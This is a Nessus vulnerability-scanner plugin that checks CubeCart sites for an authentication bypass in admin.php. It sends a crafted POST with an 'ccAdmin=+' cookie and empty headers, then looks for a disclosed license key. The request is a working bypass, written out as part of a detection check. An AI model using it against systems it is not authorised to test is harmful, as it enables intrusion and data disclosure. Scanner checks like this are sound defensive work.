#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(42371);
  script_version("$Revision: 1.1 $");

  script_name(english:"CubeCart 'admin.php' Authentication Bypass Information Disclosure");
  script_summary(english:"Tries to discover the CubeCart license key");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "A web application running on the remote host has an information\n",
      "disclosure vulnerability."
    )
  );
  script_set_attribute(
    attribute:"description",
    value:string(
      "The version of CubeCart running on the remote host has an\n",
      "authentication bypass vulnerability that could lead to information\n",
      "disclosure.  Sending a specially crafted POST request for admin.php\n",
      "bypasses authentication for the administrative user, revealing\n",
      "information such as CubeCart version, PHP version, MySQL version, web\n",
      "server version, and CubeCart license key.  A remote attacker could\n",
      "use this information to mount further attacks.\n\n",
      "Please note this plugin is similar to Nessus plugin #42353, but\n",
      "performs a slightly different check."
    )
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://forums.cubecart.com/index.php?showtopic=39766"
  );
  script_set_attribute(
    attribute:"solution",
    value:"Upgrade to CubeCart 4.3.6 or later."
  );
  script_set_attribute(
    attribute:"cvss_vector",
    value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N"
  );
  script_set_attribute(
    attribute:"vuln_publication_date",
    value:"2009/11/04"
  );
  script_set_attribute(
    attribute:"patch_publication_date",
    value:"2009/11/04"
  );
  script_set_attribute(
    attribute:"plugin_publication_date",
    value:"2009/11/04"
  );
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("cubecart_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");


port = get_http_port(default:80);
install = get_install_from_kb(appname:'cubecart', port:port);
if (isnull(install)) exit(1, "CubeCart wasn't detected on port "+port+".");

headers = make_array(
  'User-Agent', '',
  'X_CLUSTER_CLIENT_IP', '',
  'Cookie', 'ccAdmin=+'
);
url = string(install['dir'], '/admin.php');
req = http_mk_post_req(
  port:port,
  item:url,
  add_headers:headers
);
res = http_send_recv_req(port:port, req:req);
if (isnull(res)) exit(1, "The web server on port "+port+" failed to respond.");


if (egrep(string:res[2], pattern:"Software License Key: [0-9-]+"))
{
  if (report_verbosity > 0)
  {
    req_str = http_mk_buffer_from_req(req:req);
    report = string(
      "\n",
      "Nessus verified the issue using following request :\n",
      "\n",
      crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
      req_str, "\n",
      crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
    );
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
else exit(0, "The CubeCart install at "+build_url(port:port, qs:install['dir']+"/")+" is not affected.");
